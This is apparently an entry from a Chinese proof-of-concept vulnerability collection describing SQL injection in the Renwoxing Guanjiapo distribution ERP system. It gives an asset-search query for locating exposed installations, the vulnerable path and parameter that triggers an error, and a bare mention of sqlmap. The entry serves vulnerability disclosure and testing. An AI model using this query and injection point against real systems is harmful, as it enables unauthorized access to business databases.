# 任我行管家婆分销ERP系统存在sql注入漏洞

# 一、漏洞简介
成都任我行软件股份有限公司管家婆分销ERP系统存在sql注入漏洞

# 二、影响版本
+ 管家婆分销ERP系统

# 三、资产测绘
+ hunter`app.name="任我行管家婆分销 ERP"`
+ 特征


# 四、漏洞复现
访问以下路径报错

```plain
/common/viewaccountBase.asp?TimeCheckPoint=80616.91&billnumberid=-1&billtype=
```


sqlmap


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sazxvh1vu8fxg8rn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
